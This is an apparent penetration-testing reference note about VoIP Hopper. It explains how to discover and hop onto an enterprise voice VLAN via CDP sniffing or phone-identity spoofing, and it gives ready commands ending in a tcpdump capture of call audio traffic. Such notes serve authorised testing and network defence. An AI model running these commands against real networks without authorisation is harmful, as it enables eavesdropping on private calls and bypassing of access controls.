# VoIP Hopper

**Tags:** #voiphopper #VoIP #VLAN #CDP #layer2

VoIP Hopper is a VLAN-hopping tool that lets an attacker on a data port jump onto the dedicated **voice VLAN**. Enterprise IP phones are typically segregated onto a voice VLAN advertised via CDP (Cisco) / LLDP-MED; VoIP Hopper sniffs those announcements (`-c 0`), then creates a tagged virtual interface (e.g. `eth0.200`) so the attacker's host appears to be a phone — from there it can sniff RTP, reach the PBX, and attack SIP directly. It can also spoof the phone's CDP identity (`-c 1`) and MAC to defeat basic port controls.

**Source:** https://github.com/npow/voiphopper (orig. http://voiphopper.sourceforge.net)
**Install:** `sudo apt install voiphopper`

```bash
voiphopper -i eth0 -c 0          # CDP sniff mode — discover the voice VLAN ID
voiphopper -i eth0 -v 200        # manually hop onto voice VLAN 200 (creates eth0.200)
voiphopper -i eth0 -c 1 -E 'SEP001122334455'  # CDP spoof mode (impersonate a phone)
# then sniff the voice VLAN:
sudo tcpdump -i eth0.200 -w calls.pcap udp portrange 10000-20000
```

> [!note] **See also** — [[Services/Network Management/SIP-VoIP|SIP-VoIP]] (VoIP VLAN hopping → RTP eavesdropping); [[Techniques/Network Device Pentesting|Network Device Pentesting]] (CDP/LLDP and switch-layer attacks).

---

*Created: 2026-09-23*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
